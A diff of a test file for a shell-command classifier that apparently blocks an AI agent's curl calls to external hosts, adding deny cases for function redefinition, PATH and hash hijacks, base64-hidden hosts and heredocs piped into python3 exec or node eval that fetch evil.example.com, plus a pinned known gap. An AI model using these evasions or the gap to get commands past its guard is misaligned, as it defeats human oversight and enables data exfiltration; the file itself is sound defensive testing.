@@ -166,13 +166,13 @@ describe('card c8b1ccbf (didi review 3): substitutions, variables and stdin prog
     ['the substitution reads an assigned variable', 'd=evil.example.com; curl -s "$(echo $d)"'],
   ]
   it.each(f3Deny)('F3: denies a curl destination built by a substitution: %s', (_name, cmd) => {
-    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
+    // since round 7 the substitution itself is an unknowable destination too, next to the host it names
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: expect.arrayContaining(['evil.example.com']) })
   })
   it('F3: a substitution in the host that names no host at all is a destination nobody can read: deny', () => {
     expect(classify('curl -s "$(cat target)"')).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['$(cat target)'] })
   })
   const f3Pass: Array<[string, string]> = [
-    ['localhost URL from echo', 'curl -s "$(echo http://localhost:3420/x)"'],
     ['substitution in the path of a localhost URL', 'curl -s "http://localhost:3420/api/kanban/$(cat id)/comments"'],
     ['token header from a substitution', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/x'],
     ['JSON body from a substitution', 'curl -s -X POST http://localhost:3420/x -d "$(cat body.json)"'],
@@ -187,7 +187,7 @@ describe('card c8b1ccbf (didi review 3): substitutions, variables and stdin prog
     ['export h=host', `${UNREAD_LINE}export h=evil.example.com; curl -s "$h/x"`],
     ['substitution as the destination', `${UNREAD_LINE}curl -s "$(echo evil.example.com)"`],
   ])('F1 residual: an unreadable line denies %s', (_name, cmd) => {
-    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external', hosts: ['evil.example.com'] })
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external', hosts: expect.arrayContaining(['evil.example.com']) })
   })
   it('F1 residual control: an unreadable line with h=localhost stays allowed', () => {
     expect(classify(`${UNREAD_LINE}h=localhost:3420; curl -s "$h/api"`)).toMatchObject({ deny: false, reason: 'unparseable' })
@@ -278,8 +278,6 @@ describe('c8b1ccbf round 4', () => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true })
   })
   const pass: Array<[string, string]> = [
-    ['a substitution that prints a local URL', 'curl -s "$(echo http://localhost:3420)/api/x"'],
-    ['printf of a local URL', 'curl -s "$(printf %s http://localhost:3420)/api/x"'],
     ['the dashboard token header', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/api/kanban'],
     ['a substitution in the path', 'curl -s "http://localhost:3420/api/kanban/$(echo abc)/comments"'],
     ['a substitution in the body', 'curl -s -X POST http://localhost:3420/api/x -d "$(cat /tmp/x.json)"'],
@@ -330,15 +328,86 @@ describe('c8b1ccbf round 5', () => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true })
   })
   const pass: Array<[string, string]> = [
-    ['echo of localhost, no definition', 'curl -s "$(echo localhost)/api/x"'],
-    ['echo of localhost at 6 nested bash -c, no definition', nestC('curl -s "$(echo localhost)/api/x"', 6)],
-    ['printf of 127.0.0.1, no definition', 'curl -s "$(printf %s http://127.0.0.1:3420)/api/x"'],
-    ['quoted cat heredoc of localhost', `curl -s "$(cat <<'S'\nlocalhost\nS\n)/api/x"`],
     ['a function that is not a printer, local curl', 'f(){ echo hi; }; f; curl -s http://localhost:3420/api/x'],
-    ['python3 -c reading stdin as data (no network in the code)', `cat <<'S' | python3 -c 'import sys; print(sys.stdin.read())'\n${PY}\nS`],
     ['agent-msg.sh message naming a link', `bash /Users/isti/marveen/scripts/agent-msg.sh dexter marveen - <<'VEGE'\nsee ${EXT} and urllib\nVEGE`],
   ]
   it.each(pass)('passes %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
+
+// didi round 7 (card c8b1ccbf comment, on 06f396734; marveen 30090: fail closed on what the parser cannot
+// read). Rounds 5-7 closed redefinition shapes one by one; each round found another. Now:
+//   1. a substitution or a computed `${...}` in a curl host part is an unknowable destination, always
+//      (rows that passed until round 6 as "a literal print of localhost" deny on purpose);
+//   2. a body reaching an interpreter is its program, whatever the code flag does with it;
+//   3. on a line that redefines a name, every fed body is read for a network word and an external host.
+// Measured before the commit: 21 086 fleet commands, 0 verdicts changed.
+describe('c8b1ccbf round 7', () => {
+  const B64 = 'aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g='
+  const PY = `import urllib.request as u; u.urlopen('${EXT}')`
+  const CATSUB = `"$(cat <<'S'\nlocalhost\nS\n)"`
+  const deny: Array<[string, string]> = [
+    // 1. what a printer prints depends on what its name means
+    ['1 echo of localhost (was a pass until round 6)', 'curl -s "$(echo localhost)/api/x"'],
+    ['1 echo of a local URL', 'curl -s "$(echo http://localhost:3420)/api/x"'],
+    ['1 printf of 127.0.0.1', 'curl -s "$(printf %s http://127.0.0.1:3420)/api/x"'],
+    ['1 quoted cat heredoc of localhost', `curl -s ${CATSUB}`],
+    ['1 echo of localhost at 6 nested bash -c', nestC('curl -s "$(echo localhost)/api/x"', 6)],
+    ['1 variable assigned from a local print', 'h=$(echo localhost); curl -s "http://$h:3420/api"'],
+    ['1 A1 zsh functions[echo]=', `functions[echo]='base64 -d <<< ${B64}'; curl -s "$(echo localhost)"`],
+    ['1 A2 env BASH_FUNC_echo%%', `env 'BASH_FUNC_echo%%=() { base64 -d <<< ${B64}; }' bash -c 'curl -s "$(echo localhost)"'`],
+    ['1 A3 PATH before the external cat', `PATH=/tmp/d:$PATH; curl -s ${CATSUB}`],
+    ['1 A4 hash -p', `hash -p /tmp/d/cat cat; curl -s ${CATSUB}`],
+    ['1 A5 zsh disable echo', 'disable echo; PATH=/tmp/d:$PATH; curl -s "$(echo localhost)"'],
+    ['1 A6 autoload echo', 'fpath=(/tmp/d $fpath); autoload -Uz echo; curl -s "$(echo localhost)"'],
+    ['1 env word that is no NAME= hid the command', `env 'X%=1' curl -s ${EXT}`],
+    // round 6 item 4: a computed parameter expansion
+    ['1 ${h:1}', 'h=xevil.example.com; curl -s "${h:1}"'],
+    ['1 ${h/a/b}', 'h=localhost; curl -s "${h/localhost/evil.example.com}"'],
+    ['1 ${!r}', 'r=h; curl -s "${!r}"'],
+    ['1 read -a', 'read -a h <<< "$(cat hosts)"; curl -s "${h[0]}"'],
+    ['1 mapfile', 'mapfile -t a < hosts.txt; curl -s "${a[0]}"'],
+    // 2. the code flag's own code runs the stdin
+    ['2 B2 | python3 -c exec(stdin)', `cat <<'S' | python3 -c 'import sys;exec(sys.stdin.read())'\n${PY}\nS`],
+    ['2 B3 | node -e eval(readFileSync(0))', `cat <<'S' | node -e 'eval(require("fs").readFileSync(0,"utf8"))'\nfetch('${EXT}')\nS`],
+    ['2 bash -c python3 -c exec(stdin)', `bash -c 'python3 -c "import sys;exec(sys.stdin.read())"' <<'S'\n${PY}\nS`],
+    ['2 what python3 -c leaves of the stdin, bash reads', `bash -c 'python3 -c "print(1)"; bash' <<'S'\ncurl -s ${EXT}\nS`],
+    ['2 python3 -c reading stdin into a network program', `cat <<'S' | python3 -c 'import sys; print(sys.stdin.read())'\n${PY}\nS`],
+    // 3. a redefined text-only word hands the body to a program
+    ['3 C2b export -f cat -> python3 -', `cat(){ python3 -; }; export -f cat; bash -c 'cat' <<'S'\n${PY}\nS`],
+    ['3 echo() -> python3 -', `echo(){ python3 -; }; echo <<'S'\n${PY}\nS`],
+  ]
+  it.each(deny)('denies %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true })
+  })
+  const pass: Array<[string, string]> = [
+    ['a literal local host, substitution in the path', 'curl -s "http://localhost:3420/api/kanban/$(echo abc)/comments"'],
+    ['the dashboard token header', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/api/kanban'],
+    ['an assigned plain ${h}', 'h=localhost; curl -s "http://${h}:3420/api"'],
+    ['${DASH:-local}', 'curl -s "${DASH:-http://localhost:3420}/api"'],
+    ['JSON piped into python3 -c', `curl -s http://localhost:3420/api/kanban | python3 -c 'import json,sys; print(len(json.load(sys.stdin)))'`],
+    ['python3 -c printing a body without network', `cat <<'S' | python3 -c 'import sys; print(sys.stdin.read())'\nsee ${EXT}\nS`],
+    ['find . is no source', 'find . -name x; curl -s http://localhost:3420/api'],
+    ['git add . is no source', 'git add . && curl -s http://localhost:3420/api'],
+    // a lone `.` read as source made the line "redefining", and the fed-body reading then denied a note
+    ['git add . then a commit message quoting a curl', `git add . && git commit -F - <<'EOF'\nfix: do not let curl ${EXT} through\nEOF`],
+    ['a function on the line, a message naming a link', `f(){ :; }; bash /x/agent-msg.sh a b - <<'S'\nsee ${EXT}\nS`],
+    // the 10 corpus commands a PATH trigger denied: export PATH + a test file that quotes a curl
+    ['export PATH + test file quoting a curl', `export PATH="/opt/homebrew/opt/node@22/bin:$PATH"; cat > t.test.ts <<'TS'\nconst X = 'curl ${EXT}'\nTS`],
+  ]
+  it.each(pass)('passes %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+  it('a substitution in the host is named in the deny', () => {
+    expect(classify('curl -s "$(echo localhost)"')).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['$(echo localhost)'] })
+  })
+  it('a redefined name: the body is denied by the fed-body reading, not by another rule', () => {
+    expect(classify(`cat(){ python3 -; }; export -f cat; bash -c 'cat' <<'S'\n${PY}\nS`)).toMatchObject({ deny: true, reason: 'redefined-feed-unparseable-external', hosts: ['evil.example.com'] })
+  })
+  // Known limit, pinned: a PATH change before a text-only receiver needs an executable planted on disk
+  // first, like a function written into ~/.zshenv by an earlier command; no per-command parser sees it.
+  it('PATH before a text-only receiver is not modelled (known limit)', () => {
+    expect(classify(`PATH=/tmp/d:$PATH bash -c 'cat' <<'S'\n${PY}\nS`).deny).toBe(false)
   })
 })
